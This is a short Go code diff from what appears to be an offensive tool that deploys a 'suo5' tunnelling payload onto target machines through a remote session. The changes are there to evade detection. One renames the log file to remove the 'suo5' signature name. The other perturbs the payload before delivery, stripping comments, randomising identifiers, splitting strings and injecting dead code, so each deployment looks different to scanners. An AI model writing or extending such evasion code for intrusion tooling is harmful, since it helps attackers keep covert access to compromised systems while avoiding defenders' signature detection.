@@ -178,7 +178,7 @@ func PlanSuo5(o *Suo5PlanOpts) (*Plan, error) {
 		SocksPort:    port,
 		AuthUser:     user,
 		AuthPass:     pass,
-		ServerLog:    o.DataDir + "/suo5-" + tag + ".log",
+		ServerLog:    o.DataDir + "/" + tag + ".run.log", // 批 7 P1-4:去 "suo5" 特征名
 		VerifyAddr:   o.VerifyAddr,
 		PayloadFile:  file,
 		PayloadName:  name,
@@ -235,6 +235,9 @@ func (m *Manager) deploySuo5Into(ctx context.Context, id int64, sess session.Ses
 	if err != nil {
 		return fmt.Errorf("层 payload_write: 读本地 payload 失败： %w", err)
 	}
+	// 批 7 P1-2：投递前做一次性结构扰动（注释剥除/标识符随机化/字符串拆拼/
+	// 死代码注入），每次部署内容不同但协议行为逐字节等价；原文件不动。
+	data = perturbSuo5Payload(p.PayloadFile, data)
 	stdout, _, err := sess.Exec(ctx, "pwd", probeTimeout)
 	if err != nil {
 		return fmt.Errorf("层 payload_write: 目标侧定位目录失败： %w", err)
